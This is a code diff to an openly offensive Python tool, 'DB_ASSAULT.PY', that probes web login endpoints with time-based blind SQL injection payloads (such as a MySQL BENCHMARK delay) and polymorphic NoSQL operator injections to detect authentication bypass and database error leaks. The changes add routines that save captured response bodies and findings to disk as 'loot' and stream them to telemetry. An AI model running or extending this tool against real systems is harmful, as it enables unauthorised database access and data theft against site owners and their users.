@@ -1,10 +1,11 @@
 #!/usr/bin/env python3
 """
-DB_ASSAULT.PY — Aggressive Database Exploitation & Adaptive Time-Based Blind Engine
+DB_ASSAULT.PY — Aggressive Database Exploitation & Adaptive Time-Based Blind Engine v7.5
 Features:
 - Dynamic baseline latency calibration for precise time-based blind SQLi
 - Real-time error-pattern fingerprinting & adaptive payload mutation
 - Polymorphic type-variant fuzzing (String-wrapped, Native NoSQL Operators, and Array payloads)
+- Automated immutable disk persistence (loot_output/) via centralized framework logger
 - Zero-disk live terminal streaming with robust color mapping
 """
 import asyncio
@@ -15,6 +16,10 @@ import time
 import sys
 import re
 from urllib.parse import urlsplit
+
+# Import centralized framework telemetry and immutable loot persistence
+from modules.loot_logger import save_session_loot
+from modules.telemetry import stream_proof
 
 REQUEST_TIMEOUT = 12
 MAX_RESPONSE_SIZE = 128 * 1024
@@ -42,7 +47,6 @@ SQL_TIME_PAYLOADS = [
     "1' AND BENCHMARK(50000000,MD5(1))-- -"
 ]
 
-# Polymorphic Payload Matrices: Tested across String-wrapped, NoSQL Object, and Array variants
 NOSQL_POLYMORPHIC_VECTORS = [
     {
         "name": "NoSQL Regex/Not-Equal Operator",
@@ -116,7 +120,7 @@ async def calibrate_baseline(host, port, endpoint, secure):
     if latencies:
         avg = sum(latencies) / len(latencies)
         log(f"[+] Baseline latency established: {round(avg, 3)}s", "GREEN")
-        return avg + 4.0  # Dynamic threshold: baseline + 4 second sleep delta
+        return avg + 4.0
     return 4.5
 
 async def run_nosql_assault(target_host, port=None, use_ssl=None):
@@ -153,9 +157,22 @@ async def run_nosql_assault(target_host, port=None, use_ssl=None):
             res = send_http(host, target_port, endpoint, {"username": payload, "password": "password"}, secure)
             if res["elapsed"] >= time_threshold:
                 log(f"[!] ADAPTIVE TIME-BASED BLIND SQLi CONFIRMED [{endpoint}] (Delay: {res['elapsed']}s)", "RED")
-                findings.append({"vector": "Time-Based Blind SQLi", "endpoint": endpoint, "payload": payload, "delay": res["elapsed"]})
+                finding = {"vector": "Time-Based Blind SQLi", "endpoint": endpoint, "payload": payload, "delay": res["elapsed"]}
+                findings.append(finding)
+                
+                # STREAM TELEMETRY & PERSIST DB LOOT TO DISK IMMEDIATELY
+                stream_proof("DB_TIME_BASED_SQLI", endpoint, {"payload": payload}, f"Delay: {res['elapsed']}s", finding)
+                save_session_loot(
+                    target=target_host,
+                    endpoint=endpoint,
+                    finding_type="DB_TIME_BASED_SQLI_SUCCESS",
+                    status=res["status"],
+                    headers={},
+                    body=res["body"],
+                    extra_loot=finding
+                )
 
-        # 2. Polymorphic NoSQL / Injection Vector Fuzzing (String, Object, and Array variants)
+        # 2. Polymorphic NoSQL / Injection Vector Fuzzing
         for vector in NOSQL_POLYMORPHIC_VECTORS:
             for variant_type in ["string_variant", "object_variant", "array_variant"]:
                 payload = vector[variant_type]
@@ -164,12 +181,36 @@ async def run_nosql_assault(target_host, port=None, use_ssl=None):
                 error_match = DB_ERROR_PATTERNS.search(res["body"])
                 if error_match and "must be a string" not in error_match.group(0):
                     log(f"[!] Database Error Leaked [{endpoint}] ({vector['name']} - {variant_type}): {error_match.group(0)}", "YELLOW")
-                    findings.append({"vector": f"Error-Based Inference [{variant_type}]", "endpoint": endpoint, "error": error_match.group(0)})
+                    finding = {"vector": f"Error-Based Inference [{variant_type}]", "endpoint": endpoint, "error": error_match.group(0)}
+                    findings.append(finding)
+                    
+                    stream_proof("DB_ERROR_LEAK", endpoint, {"vector": vector["name"]}, error_match.group(0), finding)
+                    save_session_loot(
+                        target=target_host,
+                        endpoint=endpoint,
+                        finding_type="DB_ERROR_BASED_INFERENCE",
+                        status=res["status"],
+                        headers={},
+                        body=res["body"],
+                        extra_loot=finding
+                    )
 
                 if res["status"] in (200, 201, 302) and len(res["body"]) > 50 and "validation_error" not in res["body"]:
                     log(f"[+] DATABASE BYPASS / EXFILTRATION TRIGGERED [{endpoint}] ({vector['name']} - {variant_type})", "GREEN")
                     log(f"  └── Response Excerpt: {res['body'][:150]}", "CYAN")
-                    findings.append({"vector": f"Polymorphic Injection [{variant_type}]", "endpoint": endpoint, "payload": payload, "response_sample": res["body"][:100]})
+                    finding = {"vector": f"Polymorphic Injection [{variant_type}]", "endpoint": endpoint, "payload": str(payload), "response_sample": res["body"][:100]}
+                    findings.append(finding)
+                    
+                    stream_proof("DB_BYPASS_SUCCESS", endpoint, {"vector": vector["name"]}, res["body"][:300], finding)
+                    save_session_loot(
+                        target=target_host,
+                        endpoint=endpoint,
+                        finding_type="DB_POLYMORPHIC_BYPASS_SUCCESS",
+                        status=res["status"],
+                        headers={},
+                        body=res["body"],
+                        extra_loot=finding
+                    )
 
     log(f"[+] Database assault complete. Total confirmed vectors: {len(findings)}", "GREEN")
     return findings
